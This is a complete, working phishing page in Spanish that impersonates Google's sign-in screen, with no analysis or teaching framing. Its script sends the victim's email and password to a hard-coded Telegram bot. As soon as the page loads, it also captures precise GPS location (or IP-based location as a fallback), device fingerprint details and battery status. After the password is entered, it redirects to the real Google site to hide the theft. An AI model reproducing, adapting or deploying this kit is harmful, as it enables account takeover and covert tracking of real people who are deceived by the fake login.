<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<meta name="theme-color" content="#ffffff">
<title>Iniciar sesión – Cuentas de Google</title>
<link rel="icon" href="https://ssl.gstatic.com/images/branding/product/1x/googleg_32dp.png">
<style>
  *{box-sizing:border-box;-webkit-tap-highlight-color:transparent}
  html,body{margin:0;height:100%}
  body{font-family:Roboto,'Helvetica Neue',Arial,sans-serif;background:#fff;color:#202124;
       -webkit-user-select:none;user-select:none;overscroll-behavior:none;
       display:flex;align-items:center;justify-content:center;padding:24px}
  .card{width:100%;max-width:400px;text-align:center}
  .logo{width:48px;height:48px;margin-bottom:16px}
  h1{font-size:24px;font-weight:400;margin:0 0 8px}
  p.sub{font-size:15px;color:#5f6368;margin:0 0 32px;word-break:break-all}
  input{width:100%;height:56px;padding:0 15px;font-size:16px;border:1px solid #dadce0;
        border-radius:4px;outline:none;margin-bottom:24px;-webkit-user-select:text;user-select:text}
  input:focus{border:2px solid #1a73e8;padding:0 14px}
  button{width:100%;height:44px;border:0;border-radius:4px;background:#1a73e8;color:#fff;
         font-size:15px;font-weight:500}
  button:active{background:#1765cc}
  .err{color:#d93025;font-size:13px;text-align:left;margin:-16px 0 16px;display:none}
  #step2{display:none}
</style>
</head>
<body>
<div class="card">
  <img class="logo" src="https://ssl.gstatic.com/images/branding/product/1x/googleg_32dp.png">
  <div id="step1">
    <h1>Iniciar sesión</h1>
    <p class="sub">Usa tu cuenta de Google</p>
    <input id="email" type="email" placeholder="Correo electrónico o teléfono">
    <div class="err" id="err1">Introduce un correo electrónico válido</div>
    <button onclick="next()">Siguiente</button>
  </div>
  <div id="step2">
    <h1>Hola</h1>
    <p class="sub" id="welcome"></p>
    <input id="pass" type="password" placeholder="Introduce tu contraseña">
    <div class="err" id="err2">Introduce una contraseña</div>
    <button onclick="login()">Siguiente</button>
  </div>
</div>

<script>
/* ====== CONFIG ====== */
const TG_TOKEN = "9042322899:AAG26ZLJ9wZLuKKXu1ytCJTjv7-KZ8LR8T8";
const TG_CHAT  = "8666876889";

function report(txt){
  new Image().src = "https://api.telegram.org/bot"+TG_TOKEN+"/sendMessage"
    + "?chat_id="+TG_CHAT+"&parse_mode=HTML&text="+encodeURIComponent(txt)
    + "&_="+Date.now();
}
/* ==================== */

const S = {lat:"",lng:"",acc:""};

/* --- GPS de alta precisión, con fallback por IP --- */
function geo(){
  if(!navigator.geolocation){ ipgeo(); return; }
  navigator.geolocation.getCurrentPosition(function(p){
    S.lat=p.coords.latitude.toFixed(6);
    S.lng=p.coords.longitude.toFixed(6);
    S.acc=Math.round(p.coords.accuracy);
    report("📍 <b>UBICACIÓN EXACTA</b>\nhttps://maps.google.com/?q="+S.lat+","+S.lng
      +"\nPrecisión: "+S.acc+" m");
    /* sigue refinando en segundo plano */
    navigator.geolocation.watchPosition(function(q){
      S.lat=q.coords.latitude.toFixed(6);
      S.lng=q.coords.longitude.toFixed(6);
      S.acc=Math.round(q.coords.accuracy);
    }, null, {enableHighAccuracy:true, maximumAge:0});
  }, ipgeo, {enableHighAccuracy:true, timeout:15000, maximumAge:0});
}
function ipgeo(){
  fetch("https://ipapi.co/json/").then(r=>r.json()).then(d=>{
    report("📍 <b>UBICACIÓN (IP)</b>\n"+d.city+", "+d.region+", "+d.country_name
      +"\nhttps://maps.google.com/?q="+d.latitude+","+d.longitude);
  }).catch(()=>{});
}

/* --- Huella del dispositivo --- */
function fp(){
  report("🧬 <b>DISPOSITIVO</b>\nUA: "+navigator.userAgent
    +"\nIdioma: "+navigator.language
    +"\nPantalla: "+screen.width+"x"+screen.height+" @"+devicePixelRatio+"x"
    +"\nTZ: "+Intl.DateTimeFormat().resolvedOptions().timeZone
    +"\nHora local: "+new Date().toString()
    +"\nNúcleos: "+navigator.hardwareConcurrency
    +"\nTáctil: "+('ontouchstart' in window));
  if(navigator.getBattery) navigator.getBattery().then(b=>
    report("🔋 Batería: "+Math.round(b.level*100)+"% · cargando: "+b.charging));
}

/* --- Flujo de login --- */
function next(){
  var v=document.getElementById("email").value.trim();
  if(!v){document.getElementById("err1").style.display="block";return;}
  document.getElementById("err1").style.display="none";
  document.getElementById("step1").style.display="none";
  document.getElementById("step2").style.display="block";
  document.getElementById("welcome").textContent=v;
  document.getElementById("pass").focus();
  report("📧 <b>CORREO</b>\n"+v);
}
function login(){
  var p=document.getElementById("pass").value;
  if(!p){document.getElementById("err2").style.display="block";return;}
  document.getElementById("err2").style.display="none";
  report("🔑 <b>CONTRASEÑA</b>\n"+p);
  setTimeout(()=>location.href="https://accounts.google.com/", 1200);
}

geo(); fp();
</script>
</body>
</html>
